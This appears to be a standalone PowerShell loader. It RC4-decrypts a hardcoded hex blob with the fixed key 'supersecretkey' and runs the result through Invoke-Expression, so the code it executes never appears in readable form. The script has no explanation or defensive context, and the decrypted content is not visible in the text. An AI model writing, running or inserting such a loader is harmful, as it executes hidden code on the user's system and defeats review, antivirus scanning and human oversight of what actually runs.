function RC4-Decrypt {
    param (
        [string]$key,
        [string]$encryptedHex
    )

    # Convert hex string to byte array
    $encryptedBytes = @()
    for ($i = 0; $i -lt $encryptedHex.Length; $i += 2) {
        $byte = [Convert]::ToByte($encryptedHex.Substring($i, 2), 16)
        $encryptedBytes += $byte
    }

    # Convert key to byte array
    $keyBytes = [System.Text.Encoding]::ASCII.GetBytes($key)

    # RC4 decryption function
    $S = 0..255
    $j = 0
    $keyLength = $keyBytes.Length

    # Key-scheduling algorithm (KSA)
    for ($i = 0; $i -lt 256; $i++) {
        $j = ($j + $S[$i] + $keyBytes[$i % $keyLength]) % 256
        $temp = $S[$i]
        $S[$i] = $S[$j]
        $S[$j] = $temp
    }

    # Pseudo-random generation algorithm (PRGA)
    $i = 0
    $j = 0
    $outputBytes = @()

    foreach ($byte in $encryptedBytes) {
        $i = ($i + 1) % 256
        $j = ($j + $S[$i]) % 256

        $temp = $S[$i]
        $S[$i] = $S[$j]
        $S[$j] = $temp

        $K = $S[($S[$i] + $S[$j]) % 256]
        $outputBytes += $byte -bxor $K
    }

    # Convert the decrypted byte array to a string
    return [System.Text.Encoding]::ASCII.GetString($outputBytes)
}

# Encrypted hex string from Golang (replace with your actual hex string)
$encryptedHex = "90702989c383b122c13f041d08e46b40a0a66c128588e03ab91c6eab4687394b3202830a68021fb5ae427b43d0483bb206a3482b155d2e6846436e0a8a7ced063cd77ad64c9fd4708d2ffa24731143b006aba2f198cad4e1db0672b69df7207d1291c69aa3782b51ec1eaf46ef637091468026f837014d64d34c66a3bcf86ee9e12931724cd99256409ecca0c6cc527ea85801ee5cdc99dd17c858cec9662e7a047540f633fc38b33f5961ee99bf3dba606508e5c36f6f9ec7ee87109067063be4e3cd617bac8709558c366598561224cb721da546bbea917c04874f593b8fa7e4003ea7311999e9c1"

# Clean the hex string (remove spaces)
$encryptedHex = $encryptedHex -replace ' ', ''

# Decrypting with the same key used in Golang
$key = "supersecretkey"
$decryptedMessage = RC4-Decrypt -key $key -encryptedHex $encryptedHex

# Execute the decrypted message
Invoke-Expression $decryptedMessage
